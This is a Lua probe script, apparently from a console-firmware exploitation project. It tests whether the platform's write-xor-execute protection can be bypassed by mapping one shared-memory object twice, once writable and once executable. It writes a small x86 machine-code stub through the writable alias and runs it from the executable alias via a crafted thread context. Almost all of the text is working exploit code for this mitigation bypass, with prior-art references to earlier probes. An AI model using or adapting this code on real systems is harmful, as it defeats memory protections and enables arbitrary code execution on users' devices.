-- CRASH_CLASS: HIGH -- the last step executes attacker bytes; if the page is NX the child faults and
-- the process may die (1459a showed a fetch fault takes it down).  Every step prints before it runs.
-- PROBE 1468a: W^X via DUAL MAPPING -- write through one alias, execute through another
--
-- Context:
--   W^X on 14.10 has been measured only on SINGLE mappings: mprotect refuses prot 0x4 anywhere,
--   mmap prot 0x7 returns a writable page whose first instruction faults (424a-424c), mmap prot 0x5
--   returns an execute-only page that cannot be written, and 588 (dmem page attribute modify) returns
--   0 while 547 still reports prot 3 (54d/124a).  The enforcement is described as hypervisor-side.
--
--   What has never been tried is the obvious hole in a per-mapping implementation: map the SAME
--   physical object twice, once writable and once executable.  Each PTE is then individually legal
--   (W-only and X-only), and only an implementation that tracks permissions per PHYSICAL page, not
--   per PTE, refuses it.  POSIX shm is the vehicle: 482 shm_open works with SHM_ANON, 480 ftruncate
--   sizes it, and two MAP_SHARED mappings of one descriptor share pages.
--
--   Test bytes at the executable alias, 9 bytes:
--       B8 44 43 42 41   mov eax, 0x41424344
--       89 07            mov [rdi], eax        (rdi = marker, delivered by the thr_create ucontext)
--       EB FE            jmp $
--   A marker change proves the CPU fetched and ran them from the X alias.  The child then spins, so
--   the process stays alive and later steps still run.
--
-- -- prior art:
--   results/phase3_signals_codexec/424a-424c (single-mapping W^X: 0x7 writable+NX, 0x5 X-only)
--   results/phase19_posixshm/391a_shm_open_retest.lua (shm_open 482 shape: SHM_ANON=1, 0x202, 0x180)
--   results/phase36_realargs/1459a_fault_poison_isolation_20261109_174957.txt (a fetch fault kills the process)
--   probes/phase17_new_vectors/156d_thr_create_child_executes.lua (ucontext gates + GPR block)
--   docs/VM_LAYER_14_10.md

print("=== PROBE 1468a: DUAL-MAPPING W^X TEST ===")
print("")

local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function es() local ok,s=pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function rd(a) local ok,v=pcall(function() return to_num(memory.read_dword(uint64(a))) end) if ok then return v % 4294967296 end return nil end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function wb(a,v) pcall(function() memory.write_byte(uint64(a), v) end) end

local function call(sc, a1, a2, a3, a4, a5, a6)
    a5 = a5 or 0; a6 = a6 or 0
    local ok, rv = pcall(function() return sc(uint64(a1),uint64(a2),uint64(a3),uint64(a4),uint64(a5),uint64(a6)) end)
    if not ok then return nil end
    return to_num(rv)
end

local PID = to_num(mk(20)())
print(string.format("[0] pid=%d", PID))

local sc_shm, sc_trunc, sc_mmap = mk(482), mk(480), mk(477)
local LEN = 0x4000

print("[A] shm_open(SHM_ANON, O_CREAT|O_RDWR, 0600)")
local okA, rA = pcall(function() return sc_shm(uint64(1), uint64(0x202), uint64(0x180)) end)
local fd = okA and to_num(rA) or nil
if not okA then print("[A] EXC: " .. tostring(rA)) elseif fd < 0 then print(string.format("[A] -> %d %s", fd, es())) else print(string.format("[A] fd=%d", fd)) end
if fd == nil or fd < 0 then
    print("[A] retry shm_open(1, O_RDWR, 0600)")
    local okB, rB = pcall(function() return sc_shm(uint64(1), uint64(0x2), uint64(0x180)) end)
    if okB then fd = to_num(rB) else print("[A] EXC: " .. tostring(rB)) end
    print(string.format("[A] -> %s", fd == nil and "EXC" or tostring(fd)))
end
if fd == nil or fd < 0 then
    print("[!] no shm fd, stopping")
    print("=== PROBE 1468a COMPLETE ===")
    return
end

print(string.format("[B] ftruncate(%d, 0x%X)", fd, LEN))
local tr = call(sc_trunc, fd, LEN, 0, 0)
print(string.format("[B] -> %s", tr == nil and "EXC" or tostring(tr)))

print("[C] two MAP_SHARED mappings of the same descriptor")
local RW = call(sc_mmap, 0, LEN, 3, 1, fd, 0)
if RW == nil or RW <= 0 then print(string.format("[C] RW alias failed %s", tostring(RW))); print("=== PROBE 1468a COMPLETE ==="); return end
print(string.format("[C] RW alias = 0x%X (prot 3, MAP_SHARED)", RW))

local X = call(sc_mmap, 0, LEN, 5, 1, fd, 0)
if X == nil then print("[C] X alias EXC") elseif X <= 0 then print(string.format("[C] X alias -> %d %s", X, es())) else print(string.format("[C] X alias = 0x%X (prot 5, MAP_SHARED)", X)) end

local X2 = call(sc_mmap, 0, LEN, 7, 1, fd, 0)
if X2 == nil then print("[C] RWX alias EXC") elseif X2 <= 0 then print(string.format("[C] RWX alias -> %d %s", X2, es())) else print(string.format("[C] RWX alias = 0x%X (prot 7, MAP_SHARED)", X2)) end
if X == nil or X <= 0 then
    print("[!] no executable alias, stopping")
    print("=== PROBE 1468a COMPLETE ===")
    return
end

print("[D] write the 9-byte stub through the RW alias")
local SC = "\184\068\067\066\065\137\007\235\254"
for i = 1, #SC do wb(RW + i - 1, string.byte(SC, i)) end
local b0, b1 = rd(RW), rd(RW + 4)
print(string.format("[D] RW+0=%08X RW+4 low=%02X (expect B8444342 41)", b0 or 0, (b1 or 0) % 256))

local MARK_BLK = memory.alloc(0x20)
local MARK = as_addr(MARK_BLK)
wq(MARK, uint64(0xCAFEBABE))

local Ctx = {RDI=0x048, RAX=0x078, MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100}
local sb = call(sc_mmap, 0, 0x4000, 3, 0x1002, 0xFFFFFFFF, 0)
if sb == nil or sb <= 0 then print("[!] stack mmap failed"); print("=== PROBE 1468a COMPLETE ==="); return end
local sp = sb + 0x3000
local ctx = as_addr(memory.alloc(0x500))
local tb = as_addr(memory.alloc(8))
local ts = as_addr(memory.alloc(16))

local function run_at(rip)
    for o = 0, 0x4F8, 8 do wq(ctx + o, 0) end
    wq(ctx + Ctx.MAGIC, 0x480)
    wq(ctx + Ctx.TYPE, 0x10000)
    wq(ctx + Ctx.CS, 0x43)
    wq(ctx + Ctx.SS, 0x3B)
    wq(ctx + Ctx.RIP, rip)
    wq(ctx + Ctx.RSP, sp)
    wq(ctx + Ctx.RDI, MARK)
    wq(tb, 0)
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) or -999
end

local function nap(ms)
    wq(ts, 0); wq(ts + 8, ms * 1000000)
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end

print(string.format("[E] spawn a child at the X alias 0x%X -- if the page is NX this kills the process", X))
print(string.format("[E] before: marker=%08X", rd(MARK) or 0))
local rv = run_at(X)
nap(150)
print(string.format("[E] after:  marker=%08X thr_create=%d", rd(MARK) or 0, rv))
print("")

print("[F] control: the same stub at the writable alias 0x" .. string.format("%X", RW) .. " (expected NX)")
print(string.format("[F] before: marker=%08X", rd(MARK) or 0))
wq(MARK, uint64(0xCAFEBABE))
run_at(RW)
nap(150)
print(string.format("[F] after:  marker=%08X", rd(MARK) or 0))

print("")
print(string.format("[Z] alive pid=%d (was %d)", to_num(mk(20)()), PID))
print("")
print("=== PROBE 1468a COMPLETE ===")
